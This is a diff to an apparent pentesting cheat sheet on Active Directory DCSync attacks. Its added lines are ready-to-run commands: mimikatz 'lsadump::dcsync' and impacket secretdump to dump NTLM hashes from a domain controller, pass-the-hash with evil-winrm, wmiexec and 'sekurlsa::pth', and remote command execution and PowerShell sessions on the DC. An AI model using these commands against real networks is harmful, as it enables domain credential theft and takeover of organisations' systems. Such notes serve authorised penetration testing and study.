@@ -541,13 +541,28 @@ https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
 ```
 ```
+1- mimikatz
+./mimikatz.exe '"lsadump::dcsync /domain:corp.local /user:Administrator"'
+2.- secretdump
+impacket-secretdump -just-dc-ntlm corp.local  /<userLimitado>:pwd@IP
 impacket-secretdump -just-dc user:pwd@IP
 impacket-secretdump -just-dc user:pwd@IP -history
-impacket-secretdump -just-dc-ntlm DOMAIN.LOCAL/user:pwd@IP
-evil-winrm -i IP -u Adminstrator -H NTLM 
 
+evil-winrm -i IP -u Adminstrator -H NTLM 
 impacket-wmiexec -hashes :NTLM admiistrator@IP
 ```
+
+```
+Get-DomainUser -name <user> #get objectsid
+Get-ObjectAcl "Dc=domain,DC=com" -ResolveGUIDS | ? { ($_.ObjectAceType -like 'DS-Replication*') -and ($_.SecurityIdentifier -match 'S-1-ID' )} # id USER
+Invoke-mimikatz -Command '"lsadump::dcsync /user:pentesting\administrator"' 
+-pth
+Invoke-mimikatz -Command '"sekurlsa::pth /user:administrator /domain:pentest /ntlm:NTLM /run:powershell.exe"'
+whoami
+invoke-command -Computername dc.pentesting.local -ScriptBlock{whoami;hostname}
+Enter-PSSession -ComputerName dc.pentesting.local
+```
+
 
 ### Priv Groups of member
 ```
